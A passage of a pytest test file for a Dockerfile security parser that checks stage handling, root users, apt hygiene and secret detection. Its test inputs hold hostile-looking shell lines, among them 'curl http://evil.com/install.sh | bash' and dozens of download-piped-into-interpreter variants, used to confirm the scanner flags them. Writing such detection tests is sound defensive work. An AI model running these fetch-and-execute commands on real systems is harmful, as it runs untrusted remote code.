"""Tests for Dockerfile parser."""

from pathlib import Path
from typing import Any

import pytest

from threatcode.parsers.base import ParsedOutput, ParsedResource
from threatcode.parsers.dockerfile import DockerfileParser
from threatcode.values import is_unknown

# Anchored to this file, so the tests pass whatever directory pytest is started from
DOCKER_FIXTURES = Path(__file__).resolve().parent.parent / "fixtures" / "docker"


@pytest.fixture
def parser() -> DockerfileParser:
    return DockerfileParser()


@pytest.fixture
def insecure_dockerfile() -> str:
    return (DOCKER_FIXTURES / "insecure.Dockerfile").read_text()


@pytest.fixture
def secure_dockerfile() -> str:
    return (DOCKER_FIXTURES / "secure.Dockerfile").read_text()


class TestDockerfileParser:
    def test_parse_insecure(self, parser: DockerfileParser, insecure_dockerfile: str) -> None:
        result = parser.parse(insecure_dockerfile, source_path="insecure.Dockerfile")
        assert result.format_type == "dockerfile"
        # Should have individual instructions + summary
        assert len(result.resources) > 5

    def test_parse_secure(self, parser: DockerfileParser, secure_dockerfile: str) -> None:
        result = parser.parse(secure_dockerfile, source_path="secure.Dockerfile")
        assert result.format_type == "dockerfile"
        summary = [r for r in result.resources if r.resource_type == "dockerfile_image"]
        assert len(summary) == 1
        props = summary[0].properties
        assert props["has_user"] is True
        assert props["has_healthcheck"] is True
        assert props["uses_latest_tag"] is False
        assert props["has_workdir"] is True

    def test_summary_resource(self, parser: DockerfileParser, insecure_dockerfile: str) -> None:
        result = parser.parse(insecure_dockerfile)
        summary = [r for r in result.resources if r.resource_type == "dockerfile_image"]
        assert len(summary) == 1
        props = summary[0].properties
        assert props["has_user"] is False
        assert props["has_healthcheck"] is False
        assert props["uses_latest_tag"] is True
        assert 22 in props["exposed_ports"]
        assert props["has_ssh_exposed"] is True
        assert props["has_workdir"] is False

    def test_from_instruction(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM python:3.12\nRUN echo hello")
        froms = [r for r in result.resources if r.resource_type == "dockerfile_from"]
        assert len(froms) == 1
        assert froms[0].properties["image"] == "python:3.12"
        assert froms[0].properties["tag"] == "3.12"

    def test_latest_tag_detection(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM ubuntu\nRUN echo hi")
        summary = [r for r in result.resources if r.resource_type == "dockerfile_image"][0]
        assert summary.properties["uses_latest_tag"] is True

    def test_env_secret_detection(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM alpine\nENV DB_PASSWORD=secret")
        envs = [r for r in result.resources if r.resource_type == "dockerfile_env"]
        assert len(envs) == 1
        assert envs[0].properties["has_secret_pattern"] is True

    def test_run_curl_pipe(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM alpine\nRUN curl http://evil.com/install.sh | bash")
        runs = [r for r in result.resources if r.resource_type == "dockerfile_run"]
        assert runs[0].properties["has_curl_pipe"] is True

    def test_run_sudo(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM alpine\nRUN sudo apt-get install -y vim")
        runs = [r for r in result.resources if r.resource_type == "dockerfile_run"]
        assert runs[0].properties["has_sudo"] is True

    def test_multistage(self, parser: DockerfileParser) -> None:
        content = (DOCKER_FIXTURES / "multistage.Dockerfile").read_text()
        result = parser.parse(content)
        froms = [r for r in result.resources if r.resource_type == "dockerfile_from"]
        assert len(froms) == 2

    def test_line_continuation(self, parser: DockerfileParser) -> None:
        content = "FROM alpine\nRUN apt-get update && \\\n    apt-get install -y curl"
        result = parser.parse(content)
        runs = [r for r in result.resources if r.resource_type == "dockerfile_run"]
        assert len(runs) == 1

    def test_comments_skipped(self, parser: DockerfileParser) -> None:
        content = "# This is a comment\nFROM alpine\n# Another comment\nRUN echo hi"
        result = parser.parse(content)
        # 2 instructions, 1 stage node and the summary
        types = [r.resource_type for r in result.resources]
        assert types == [
            "dockerfile_from",
            "dockerfile_run",
            "dockerfile_stage",
            "dockerfile_image",
        ]

    def test_empty_dockerfile(self, parser: DockerfileParser) -> None:
        result = parser.parse("")
        # Should still have summary resource
        summary = [r for r in result.resources if r.resource_type == "dockerfile_image"]
        assert len(summary) == 1

    def test_provider_is_docker(self, parser: DockerfileParser) -> None:
        result = parser.parse("FROM alpine\nRUN echo hi")
        for r in result.resources:
            assert r.provider == "docker"


# ---------------------------------------------------------------------------
# Helpers for the rest of the module
# ---------------------------------------------------------------------------


def parse(text: str, source_path: str = "Dockerfile") -> ParsedOutput:
    return DockerfileParser().parse(text, source_path=source_path)


def summary(text: str) -> dict[str, Any]:
    return next(
        r.properties for r in parse(text).resources if r.resource_type == "dockerfile_image"
    )


def of_type(text: str, resource_type: str) -> list[ParsedResource]:
    return [r for r in parse(text).resources if r.resource_type == resource_type]


def first(text: str, resource_type: str) -> dict[str, Any]:
    return of_type(text, resource_type)[0].properties


class TestAddressesAndLines:
    def test_addresses_count_instructions_from_zero(self) -> None:
        result = parse("FROM alpine\n\n# c\nRUN true\nUSER app")
        addresses = [r.address for r in result.resources if r.resource_type != "dockerfile_stage"]
        assert addresses == [
            "dockerfile.from.0",
            "dockerfile.run.1",
            "dockerfile.user.2",
            "dockerfile.image.summary",
        ]

    def test_line_numbers_are_physical_after_a_continuation(self) -> None:
        text = "FROM alpine\nRUN a \\\n  && b \\\n  && c\nEXPOSE 22\n"
        expose = of_type(text, "dockerfile_expose")[0]
        assert expose.properties["line_number"] == 5
        assert expose.start_line == 5
        assert of_type(text, "dockerfile_run")[0].end_line == 4

    def test_the_source_location_is_the_path_without_a_line_suffix(self) -> None:
        resource = of_type("FROM alpine", "dockerfile_from")[0]
        assert resource.source_location == "Dockerfile"
        assert resource.start_line == 1

    def test_a_form_feed_in_a_comment_does_not_shift_line_numbers(self) -> None:
        expose = of_type("FROM alpine\n# a\x0cb\nRUN true\nEXPOSE 22", "dockerfile_expose")[0]
        assert expose.start_line == 4

    def test_a_lone_keyword_is_a_resource_with_empty_arguments(self) -> None:
        run = of_type("FROM alpine\nRUN", "dockerfile_run")[0]
        assert run.properties["arguments"] == ""
        assert run.properties["has_curl_pipe"] is False

    def test_a_non_string_input_is_converted(self) -> None:
        assert parse(b"FROM alpine".decode()).resources  # sanity
        result = DockerfileParser().parse(12345)
        assert result.format_type == "dockerfile"

    def test_the_metadata_records_the_escape_and_syntax_directives(self) -> None:
        result = parse("# syntax=docker/dockerfile:1.7\n# escape=`\nFROM x")
        assert result.metadata == {"escape": "`", "syntax": "docker/dockerfile:1.7"}

    def test_a_skipped_line_is_a_diagnostic(self) -> None:
        result = parse("FROM alpine\nset -eux\n")
        assert [(d.code, d.line, d.level) for d in result.diagnostics] == [
            ("dockerfile.skipped_line", 2, "warning")
        ]
        assert all(r.resource_type != "dockerfile_set" for r in result.resources)


class TestLowercaseAndMixedCase:
    TEXT = (
        "from python:3.12-slim\n"
        "workdir /srv\n"
        "Run pip install flask\n"
        "healthcheck --interval=30s CMD curl -f http://localhost/ || exit 1\n"
        "USER 10001\n"
        "expose 8000\n"
    )

    def test_the_summary_sees_every_instruction(self) -> None:
        props = summary(self.TEXT)
        assert props["base_image"] == "python:3.12-slim"
        assert props["has_workdir"] is True
        assert props["has_healthcheck"] is True
        assert props["has_user"] is True
        assert props["user_value"] == "10001"
        assert props["exposed_ports"] == [8000]

    def test_resource_types_use_the_upper_cased_keyword(self) -> None:
        types = {r.resource_type for r in parse(self.TEXT).resources}
        assert {"dockerfile_from", "dockerfile_run", "dockerfile_workdir"} <= types

    def test_lowercase_user_root_is_root(self) -> None:
        assert summary("from alpine\nuser root")["is_root_user"] is True


class TestContinuationsAndHeredocs:
    def test_a_comment_inside_a_run_continuation_keeps_the_rest_of_the_command(self) -> None:
        text = "FROM a\nRUN sudo true \\\n# a comment\n && curl x | sh\n"
        props = first(text, "dockerfile_run")
        assert props["has_sudo"] is True
        assert props["has_curl_pipe"] is True
        assert "#" not in props["arguments"]

    def test_a_comment_ending_in_a_backslash_keeps_the_next_instruction(self) -> None:
        props = summary("FROM a\n# set the user \\\nUSER app\n")
        assert props["has_user"] is True
        assert props["user_value"] == "app"

    def test_the_windows_escape_directive_yields_two_instructions(self) -> None:
        text = (
            "# escape=`\nFROM mcr.microsoft.com/windows/servercore:ltsc2022\n"
            "WORKDIR C:\\app\\\nUSER ContainerAdministrator\n"
        )
        props = summary(text)
        assert props["has_workdir"] is True
        assert props["user_value"] == "ContainerAdministrator"
        assert props["is_root_user"] is False

    def test_a_run_heredoc_is_analysed_with_its_body(self) -> None:
        text = (
            "FROM a\nRUN <<EOF\nset -e\nsudo apt-get update\ncurl -fsSL https://x.sh | bash\nEOF\n"
        )
        props = first(text, "dockerfile_run")
        assert props["has_sudo"] is True
        assert props["has_curl_pipe"] is True
        assert "sudo apt-get update" in props["heredoc_body"]

    def test_a_copy_heredoc_body_is_not_parsed_as_instructions(self) -> None:
        text = "FROM a\nCOPY <<EOF /etc/app.conf\nUSER root\nEXPOSE 22\nEOF\nUSER app\n"
        props = summary(text)
        assert props["user_value"] == "app"
        assert props["exposed_ports"] == []
        assert props["has_ssh_exposed"] is False
        assert len(of_type(text, "dockerfile_user")) == 1
        assert len(of_type(text, "dockerfile_expose")) == 0

    def test_a_heredoc_copy_has_no_file_sources(self) -> None:
        props = first("FROM a\nCOPY <<EOF /etc/app.conf\nx\nEOF\n", "dockerfile_copy")
        assert props["sources"] == []
        assert props["has_sensitive_file"] is False


class TestStages:
    BUILDER_USER = (
        "FROM golang:1.22 AS build\n"
        "USER builder\n"
        "HEALTHCHECK CMD true\n"
        "WORKDIR /src\n"
        "EXPOSE 22\n"
        "FROM debian:12-slim\n"
        "COPY --from=build /out/app /app\n"
    )

    def test_a_build_stage_does_not_describe_the_final_image(self) -> None:
        props = summary(self.BUILDER_USER)
        assert props["has_user"] is False
        assert props["user_value"] == ""
        assert props["has_healthcheck"] is False
        assert props["has_workdir"] is False
        assert props["exposed_ports"] == []
        assert props["has_ssh_exposed"] is False
        assert props["base_image"] == "debian:12-slim"
        assert props["stage_count"] == 2

    def test_a_hardened_build_stage_and_a_root_final_stage(self) -> None:
        text = "FROM golang AS build\nUSER app\nFROM debian\nUSER root\n"
        props = summary(text)
        assert props["has_user"] is True
        assert props["is_root_user"] is True

    def test_a_child_stage_inherits_user_healthcheck_workdir_and_ports(self) -> None:
        text = (
            "FROM debian:12-slim AS base\n"
            "USER 10001\n"
            "HEALTHCHECK CMD true\n"
            "WORKDIR /app\n"
            "EXPOSE 8080\n"
            "FROM base AS app\n"
            "COPY app /app\n"
            "EXPOSE 9090\n"
        )
        props = summary(text)
        assert props["has_user"] is True
        assert props["user_value"] == "10001"
        assert props["is_root_user"] is False
        assert props["has_healthcheck"] is True
        assert props["has_workdir"] is True
        assert props["exposed_ports"] == [8080, 9090]
        assert props["base_image"] == "debian:12-slim"

    def test_a_child_stage_can_override_what_it_inherits(self) -> None:
        text = (
            "FROM debian AS base\nUSER 10001\nHEALTHCHECK CMD true\n"
            "FROM base\nUSER root\nHEALTHCHECK NONE\n"
        )
        props = summary(text)
        assert props["is_root_user"] is True
        assert props["has_healthcheck"] is False

    def test_stage_names_are_case_insensitive(self) -> None:
        text = "FROM debian AS Base\nUSER 10001\nFROM BASE\n"
        props = summary(text)
        assert props["has_user"] is True
        assert [s.address for s in of_type(text, "dockerfile_stage")] == [
            "dockerfile.stage.base",
            "dockerfile.stage.1",
        ]

    def test_an_unnamed_stage_is_addressed_by_index(self) -> None:
        addresses = [s.address for s in of_type("FROM a\nFROM b\n", "dockerfile_stage")]
        assert addresses == ["dockerfile.stage.0", "dockerfile.stage.1"]

    def test_every_instruction_records_its_stage_and_onbuild_flag(self) -> None:
        result = parse("ARG X=1\nFROM a AS one\nRUN true\nFROM b\nUSER x\n")
        by_address = {r.address: r.properties for r in result.resources}
        assert by_address["dockerfile.arg.0"]["stage"] == ""
        assert by_address["dockerfile.run.2"]["stage"] == "one"
        assert by_address["dockerfile.user.4"]["stage"] == "1"
        assert all(
            props["onbuild"] is False
            for address, props in by_address.items()
            if address != "dockerfile.image.summary"
            and "stage" in props
            and not address.startswith("dockerfile.stage.")
        )

    def test_the_stage_node_summarizes_its_stage(self) -> None:
        stage = next(
            r for r in parse(self.BUILDER_USER).resources if r.address == "dockerfile.stage.build"
        )
        props = stage.properties
        assert props["base_ref"] == "golang:1.22"
        assert props["kind"] == "registry"
        assert props["tag"] == "1.22"
        assert props["has_user"] is True
        assert props["user_value"] == "builder"
        assert props["has_healthcheck"] is True
        assert props["exposed_ports"] == [22]
        assert props["is_final"] is False
        assert props["instruction_count"] == 5
        assert (stage.start_line, stage.end_line) == (1, 5)

    def test_the_stage_node_is_flagged_when_final(self) -> None:
        final = next(
            r for r in parse(self.BUILDER_USER).resources if r.address == "dockerfile.stage.1"
        )
        assert final.properties["is_final"] is True

    def test_an_empty_dockerfile_has_no_stages(self) -> None:
        props = summary("")
        assert props["stage_count"] == 0
        assert props["has_user"] is False
        assert props["base_image"] == ""
        assert of_type("", "dockerfile_stage") == []

    def test_instructions_without_any_from_form_an_implicit_stage(self) -> None:
        text = "USER app\nRUN true\n"
        assert summary(text)["user_value"] == "app"
        assert summary(text)["stage_count"] == 0


class TestStageEdges:
    TEXT = (
        "FROM golang:1.22 AS build\nRUN go build\n"
        "FROM build AS test\nRUN go test\n"
        "FROM gcr.io/distroless/static AS runtime\nCOPY --from=build /out /out\n"
        "COPY --from=0 /x /x\nCOPY --from=nginx:1.25 /etc/nginx /etc\n"
    )

    def edges(self) -> list[tuple[str, str, str, str, bool]]:
        return [
            (e.source, e.target, e.edge_type, e.metadata.get("relation", ""), e.declared)
            for e in parse(self.TEXT).edges
        ]

    def test_from_a_stage_is_a_base_dependency(self) -> None:
        assert (
            "dockerfile.stage.test",
            "dockerfile.stage.build",
            "dependency",
            "base",
            False,
        ) in self.edges()

    def test_copy_from_a_stage_by_name_or_index_is_a_copy_from_dependency(self) -> None:
        copies = [e for e in self.edges() if e[3] == "copy_from"]
        assert copies
        assert {(e[0], e[1]) for e in copies} == {
            ("dockerfile.stage.runtime", "dockerfile.stage.build")
        }

    def test_copy_from_an_external_image_adds_no_edge(self) -> None:
        targets = {e[1] for e in self.edges()}
        assert targets <= {"dockerfile.stage.build"} | {
            f"dockerfile.stage.{name}" for name in ("test", "runtime")
        }

    def test_every_instruction_is_contained_in_its_stage(self) -> None:
        result = parse(self.TEXT)
        containment = {e.source: e.target for e in result.edges if e.edge_type == "containment"}
        instructions = [
            r
            for r in result.resources
            if r.resource_type not in ("dockerfile_stage", "dockerfile_image")
        ]
        assert set(containment) == {r.address for r in instructions}
        assert containment["dockerfile.run.3"] == "dockerfile.stage.test"

    def test_no_edge_is_declared(self) -> None:
        assert all(e[4] is False for e in self.edges())
        assert all(e.declared is False for e in parse(self.TEXT).edges)

    def test_a_stage_that_copies_from_itself_adds_no_edge(self) -> None:
        text = "FROM a AS one\nCOPY --from=one /x /y\n"
        assert [e for e in parse(text).edges if e.edge_type == "dependency"] == []

    def test_a_forward_reference_adds_no_edge(self) -> None:
        text = "FROM a AS one\nCOPY --from=two /x /y\nFROM b AS two\n"
        assert [e for e in parse(text).edges if e.edge_type == "dependency"] == []


class TestFromParsing:
    def test_the_platform_flag_is_not_the_image(self) -> None:
        props = first("FROM --platform=$BUILDPLATFORM golang:1.22\n", "dockerfile_from")
        assert props["image"] == "golang:1.22"
        assert props["platform"] == "$BUILDPLATFORM"
        assert props["tag"] == "1.22"
        assert props["uses_latest_tag"] is False

    def test_scratch_is_not_a_registry_image(self) -> None:
        props = first("FROM scratch\n", "dockerfile_from")
        assert props["kind"] == "scratch"
        assert props["uses_latest_tag"] is False
        assert summary("FROM scratch\n")["uses_latest_tag"] is False

    def test_a_stage_reference_is_not_a_registry_image(self) -> None:
        text = "FROM golang:1.22 AS build\nFROM build AS test\n"
        props = of_type(text, "dockerfile_from")[1].properties
        assert props["kind"] == "stage"
        assert props["uses_latest_tag"] is False
        assert props["parent_stage"] == "build"
        assert summary(text)["uses_latest_tag"] is False

    def test_a_registry_with_a_port_and_no_tag_is_untagged(self) -> None:
        props = first("FROM registry.local:5000/team/app\n", "dockerfile_from")
        assert props["tag"] == "latest"
        assert props["uses_latest_tag"] is True

    def test_a_registry_with_a_port_and_a_tag(self) -> None:
        props = first("FROM registry.local:5000/team/app:2.1\n", "dockerfile_from")
        assert props["tag"] == "2.1"
        assert props["uses_latest_tag"] is False

    def test_an_arg_default_before_the_first_from_is_substituted(self) -> None:
        text = "ARG TAG=latest\nFROM base:${TAG}\n"
        props = first(text, "dockerfile_from")
        assert props["image"] == "base:latest"
        assert props["tag"] == "latest"
        assert props["uses_latest_tag"] is True
        assert summary(text)["base_image"] == "base:latest"

    def test_an_arg_default_that_pins_a_version(self) -> None:
        props = first("ARG TAG=3.19\nFROM alpine:$TAG\n", "dockerfile_from")
        assert props["uses_latest_tag"] is False

    def test_an_unresolved_variable_gives_an_unknown_tag_that_is_not_latest(self) -> None:
        text = "ARG TAG\nFROM base:${TAG}\n"
        props = first(text, "dockerfile_from")
        assert is_unknown(props["tag"])
        assert props["tag"].reference == "${TAG}"
        assert props["uses_latest_tag"] is False
        assert summary(text)["uses_latest_tag"] is False
        assert summary(text)["final_stage_uses_latest_tag"] is False

    def test_a_variable_that_is_the_whole_image_is_unknown(self) -> None:
        props = first("FROM ${BASE}\n", "dockerfile_from")
        assert props["kind"] == "variable"
        assert is_unknown(props["tag"])
        assert props["uses_latest_tag"] is False

    def test_an_unresolved_variable_is_a_diagnostic(self) -> None:
        codes = [d.code for d in parse("FROM base:${TAG}\n").diagnostics]
        assert codes == ["dockerfile.unresolved_variable"]

    def test_an_arg_declared_after_from_is_not_visible_to_from(self) -> None:
        text = "FROM a AS one\nARG TAG=1\nFROM base:${TAG}\n"
        assert is_unknown(of_type(text, "dockerfile_from")[1].properties["tag"])

    def test_a_digest_pinned_image_is_not_latest(self) -> None:
        text = "FROM debian:latest@sha256:" + "a" * 64 + "\n"
        props = first(text, "dockerfile_from")
        assert props["digest_pinned"] is True
        assert props["uses_latest_tag"] is False
        assert summary(text)["has_digest_pin"] is True

    def test_a_digest_only_reference_has_an_empty_tag(self) -> None:
        props = first("FROM debian@sha256:" + "a" * 64 + "\n", "dockerfile_from")
        assert props["tag"] == ""
        assert props["uses_latest_tag"] is False

    def test_the_audit_multistage_file(self) -> None:
        text = (
            "ARG GO_VERSION=1.22\n"
            "FROM --platform=$BUILDPLATFORM golang:${GO_VERSION}@sha256:" + "b" * 64 + " AS build\n"
            "FROM build AS test\n"
            "FROM scratch AS final\n"
        )
        props = summary(text)
        assert props["uses_latest_tag"] is False
        assert props["base_kind"] == "scratch"
        assert props["stage_count"] == 3

    def test_uses_latest_tag_is_any_stage_and_final_stage_looks_at_the_shipped_image(self) -> None:
        text = "FROM node:latest AS build\nFROM node:20.11-alpine\n"
        props = summary(text)
        assert props["uses_latest_tag"] is True
        assert props["final_stage_uses_latest_tag"] is False

    def test_a_floating_tag_other_than_latest_counts(self) -> None:
        assert summary("FROM nginx:stable\n")["uses_latest_tag"] is True
        assert summary("FROM nginx:1.25\n")["uses_latest_tag"] is False

    def test_the_base_image_of_a_stage_chain_is_its_root_image(self) -> None:
        text = "FROM debian:12-slim AS base\nFROM base AS mid\nFROM mid\n"
        props = summary(text)
        assert props["base_image"] == "debian:12-slim"
        assert props["base_kind"] == "registry"

    def test_the_final_stage_decides_the_digest_pin(self) -> None:
        text = "FROM a:1@sha256:" + "c" * 64 + " AS build\nFROM b:2\n"
        assert summary(text)["has_digest_pin"] is False

    def test_a_digest_pinned_distroless_final_stage_after_a_pinned_builder(self) -> None:
        text = (
            "FROM golang:1.22@sha256:" + "d" * 64 + " AS build\n"
            "FROM gcr.io/distroless/static-debian12:nonroot@sha256:" + "e" * 64 + "\n"
        )
        props = summary(text)
        assert props["has_digest_pin"] is True
        assert props["is_non_minimal"] is False
        assert props["uses_latest_tag"] is False

    def test_the_digest_pin_is_unknown_when_the_base_is_a_variable(self) -> None:
        props = summary("FROM ${BASE}\n")
        assert is_unknown(props["has_digest_pin"])
        assert is_unknown(props["is_non_minimal"])


class TestUserForms:
    @pytest.mark.parametrize(
        "user",
        ["root", "ROOT", "Root", "0", "00", "0:0", "root:root", "0:root", "root:0", "0:1000"],
    )
    def test_every_spelling_of_root_is_root(self, user: str) -> None:
        props = summary(f"FROM a\nUSER {user}\n")
        assert props["has_user"] is True
        assert props["is_root_user"] is True

    @pytest.mark.parametrize(
        "user", ["app", "1000", "1000:1000", "nobody:nogroup", "10001:0", "rootless", "r00t", "01"]
    )
    def test_other_users_are_not_root(self, user: str) -> None:
        props = summary(f"FROM a\nUSER {user}\n")
        assert props["has_user"] is True
        assert props["is_root_user"] is False

    def test_no_user_is_not_root(self) -> None:
        props = summary("FROM a\n")
        assert props["has_user"] is False
        assert props["is_root_user"] is False

    def test_an_unresolved_variable_user_is_unknown_not_root(self) -> None:
        props = summary("FROM a\nARG APP_USER\nUSER ${APP_USER}\n")
        assert props["has_user"] is True
        assert is_unknown(props["is_root_user"])
        assert is_unknown(props["user_value"])

    def test_an_arg_default_is_substituted_into_user(self) -> None:
        props = summary("FROM a\nARG APP_USER=root\nUSER ${APP_USER}\n")
        assert props["is_root_user"] is True

    def test_an_env_value_is_substituted_into_user(self) -> None:
        props = summary("FROM a\nENV APP_USER=app\nUSER $APP_USER\n")
        assert props["user_value"] == "app"
        assert props["is_root_user"] is False

    def test_a_global_arg_must_be_redeclared_inside_the_stage(self) -> None:
        text = "ARG APP_USER=root\nFROM a\nUSER ${APP_USER}\n"
        assert is_unknown(summary(text)["is_root_user"])
        redeclared = "ARG APP_USER=root\nFROM a\nARG APP_USER\nUSER ${APP_USER}\n"
        assert summary(redeclared)["is_root_user"] is True

    def test_the_last_user_wins(self) -> None:
        assert summary("FROM a\nUSER root\nUSER app\n")["is_root_user"] is False
        assert summary("FROM a\nUSER app\nUSER 0\n")["is_root_user"] is True

    def test_the_user_instruction_itself_reports_its_value(self) -> None:
        props = first("FROM a\nUSER 0:0\n", "dockerfile_user")
        assert props["user"] == "0:0"
        assert props["is_root"] is True


class TestHeuristicsCurlPipe:
    @pytest.mark.parametrize(
        "command",
        [
            "curl -fsSL https://x.sh | sh",
            "curl -fsSL https://x.sh | bash",
            "curl -fsSL https://x.sh | zsh",
            "curl -fsSL https://x.sh | dash",
            "curl -fsSL https://x.sh | ash",
            "curl -fsSL https://x.sh | ksh",
            "wget -qO- https://x.sh | sudo bash",
            "wget -qO- https://x.sh | sudo -E bash -s --",
            "curl https://x.py | python3",
            "curl https://x.py | python",
            "curl https://x.py | python3.12 -",
            "curl https://x.pl | perl",
            "curl https://x.rb | ruby",
            "curl https://x.js | node",
            "curl https://x.sh | env FOO=1 bash",
            "curl https://x.sh | command bash",
            "curl https://x.sh | exec sh",
            "curl https://x.sh | FOO=1 bash",
            "curl https://x.sh | /bin/bash",
            "apt-get update && curl https://x.sh | sh && echo ok",
            "curl https://x.sh | tee /tmp/x | sh",
            "curl https://x.sh |sh",
            "curl https://x.sh|sh",
            "true; curl https://x.sh | sh",
            "curl https://x.sh \\\n  | sh",
            "curl -s x 2>&1 | sh",
            "curl -s x >&2 | sh",
            "curl -s x &>/dev/null | sh",
            "curl -s x 2>/dev/null | sh",
            "curl -s x 2>&1 | sh 2>&1",
            "if true; then curl x | sh; fi",
            "if curl x | sh; then echo ok; fi",
            "for i in 1 2; do curl x | sh; done",
            "while true; do curl x | sh; done",
            "until false; do curl x | sh; done",
            "if false; then true; else curl x | sh; fi",
            "if false; then true; elif true; then curl x | sh; fi",
            "! curl x | sh",
            "{ curl x | sh; }",
        ],
    )
    def test_a_download_piped_into_an_interpreter_is_flagged(self, command: str) -> None:
        assert first(f"FROM a\nRUN {command}\n", "dockerfile_run")["has_curl_pipe"] is True

    @pytest.mark.parametrize(
        "command",
        [
            "curl -fsSL https://x/c.sha256 | sha256sum -c -",
            "curl https://x | shasum -a 256",
            "curl https://x | sha1sum",
            "curl -fsSL https://x/pkg.tgz | tar -xz -C /opt",
            "curl https://x | gpg --dearmor -o /usr/share/keyrings/x.gpg",
            "curl https://x | wc -c",
            "curl https://x | grep sh",
            "curl https://x | jq .sh",
            "curl https://x -o /tmp/x.sh && sh /tmp/x.sh",
            "curl https://x.sh > install.sh; sh install.sh",
            "echo 'curl x | sh'",
            'echo "curl x | bash"',
            "cat install.sh | sh",
            "curl https://x.sh; echo | sh",
            "curl https://x.sh && echo | sh",
            "bash script.sh | curl -X POST https://x",
            "curl https://x | shuf",
            "curl https://x | node-gyp",
            "echo then curl x | sh",
            "echo do curl x | sh",
            "curl x 2>&1 & sh",
            "curl x 2>&1 && sh",
            "curl x 2>&1; sh",
        ],
    )
    def test_other_pipelines_are_not_flagged(self, command: str) -> None:
        assert first(f"FROM a\nRUN {command}\n", "dockerfile_run")["has_curl_pipe"] is False

    def test_a_heredoc_body_is_analysed(self) -> None:
        text = "FROM a\nRUN <<EOF\ncurl https://x | sh\nEOF\n"
        assert first(text, "dockerfile_run")["has_curl_pipe"] is True

    def test_exec_form_through_a_shell_is_analysed(self) -> None:
        text = 'FROM a\nRUN ["/bin/sh", "-c", "curl https://x | sh"]\n'
        assert first(text, "dockerfile_run")["has_curl_pipe"] is True

    def test_exec_form_without_a_shell_is_a_single_command(self) -> None:
        text = 'FROM a\nRUN ["curl", "-o", "/tmp/x", "https://x"]\n'
        assert first(text, "dockerfile_run")["has_curl_pipe"] is False

    def test_a_run_option_does_not_hide_the_command(self) -> None:
        text = "FROM a\nRUN --mount=type=cache,target=/root/.cache curl https://x | sh\n"
        assert first(text, "dockerfile_run")["has_curl_pipe"] is True


class TestHeuristicsSudo:
    @pytest.mark.parametrize(
        "command",
        [
            "sudo apt-get update",
            "apt-get update && sudo apt-get install -y vim",
            "FOO=1 sudo -E make",
            "env sudo make",
            "true; sudo make",
            "curl x | sudo tee /etc/y",
            "sudo",
            "if true; then sudo make; fi",
            "for i in 1; do sudo make; done",
            "while true; do sudo make; done",
            "if false; then true; else sudo make; fi",
            "if false; then true; elif true; then sudo make; fi",
            "! sudo make",
            "{ sudo make; }",
            "sudo make 2>&1",
        ],
    )
    def test_sudo_as_a_command_is_flagged(self, command: str) -> None:
        assert first(f"FROM a\nRUN {command}\n", "dockerfile_run")["has_sudo"] is True

    @pytest.mark.parametrize(
        "command",
        [
            "apt-get install -y sudo",
            "apt-get install -y sudo curl",
            "echo pseudo code",
            "pseudo apply",
            "echo sudo",
            "command -v sudo",
            "which sudo",
            "useradd -G sudo app",
            "sed -i 's/sudo/x/' /etc/f",
            "echo then sudo make",
            "echo do sudo",
        ],
    )
    def test_the_word_sudo_elsewhere_is_not_flagged(self, command: str) -> None:
        assert first(f"FROM a\nRUN {command}\n", "dockerfile_run")["has_sudo"] is False


class TestHeuristicsApt:
    def props(self, command: str) -> dict[str, Any]:
        return first(f"FROM a\nRUN {command}\n", "dockerfile_run")

    def test_install_without_clean_or_recommends_flag(self) -> None:
        props = self.props("apt-get update && apt-get install -y curl")
        assert props["has_apt_no_clean"] is True
        assert props["has_apt_no_recommends"] is True

    def test_install_with_no_install_recommends(self) -> None:
        props = self.props("apt-get install -y --no-install-recommends curl")
        assert props["has_apt_no_recommends"] is False

    @pytest.mark.parametrize(
        "tail",
        [
            "&& rm -rf /var/lib/apt/lists/*",
            "&& apt-get clean",
            "&& apt-get autoclean",
            "&& apt clean",
            "&& rm -rf /var/lib/apt/lists/* /tmp/*",
            "&& find /var/lib/apt/lists -type f -delete",
        ],
    )
    def test_a_cleanup_in_the_same_run(self, tail: str) -> None:
        assert self.props(f"apt-get install -y curl {tail}")["has_apt_no_clean"] is False

    def test_a_cleanup_in_another_run_does_not_count(self) -> None:
        text = "FROM a\nRUN apt-get install -y curl\nRUN rm -rf /var/lib/apt/lists/*\n"
        first_run = of_type(text, "dockerfile_run")[0].properties
        assert first_run["has_apt_no_clean"] is True

    def test_an_apt_cache_mount_needs_no_cleanup(self) -> None:
        props = self.props(
            "--mount=type=cache,target=/var/cache/apt "
            "apt-get install -y --no-install-recommends curl"
        )
        assert props["has_apt_no_clean"] is False

    def test_no_install_means_no_apt_findings(self) -> None:
        props = self.props("apt-get update")
        assert props["has_apt_no_clean"] is False
        assert props["has_apt_no_recommends"] is False

    def test_apt_get_install_in_a_pipeline_or_after_options(self) -> None:
        assert self.props("apt-get -y install curl")["has_apt_no_clean"] is True
        assert self.props("echo apt-get install x")["has_apt_no_clean"] is False


class TestHeuristicsEnvAndArg:
    def env(self, args: str, instruction: str = "ENV") -> dict[str, Any]:
        resource = "dockerfile_env" if instruction == "ENV" else "dockerfile_arg"
        return first(f"FROM a\n{instruction} {args}\n", resource)

    def test_every_pair_of_a_multi_pair_line_is_parsed(self) -> None:
        props = self.env("APP=web DB_PASSWORD=hunter2 PORT=80")
        assert props["keys"] == ["APP", "DB_PASSWORD", "PORT"]
        assert props["has_secret_pattern"] is True
        assert props["secret_keys"] == ["DB_PASSWORD"]

    def test_a_multi_line_env_is_parsed(self) -> None:
        props = first("FROM a\nENV A=1 \\\n    B=2 \\\n    TOKEN_X=abc123\n", "dockerfile_env")
        assert props["keys"] == ["A", "B", "TOKEN_X"]
        assert props["secret_keys"] == ["TOKEN_X"]

    def test_the_legacy_form_takes_the_rest_of_the_line_as_the_value(self) -> None:
        props = self.env("API_TOKEN hunter2 with spaces")
        assert props["keys"] == ["API_TOKEN"]
        assert props["secret_keys"] == ["API_TOKEN"]

    def test_quoted_values_may_contain_spaces_and_equals(self) -> None:
        props = self.env('MSG="hello world" PASSWORD="a b=c"')
        assert props["keys"] == ["MSG", "PASSWORD"]
        assert props["secret_keys"] == ["PASSWORD"]

    @pytest.mark.parametrize(
        "key",
        [
            "PASSWORD",
            "DB_PASSWORD",
            "MYSQL_ROOT_PASSWORD",
            "PGPASSWORD",
            "PASSWD",
            "SECRET",
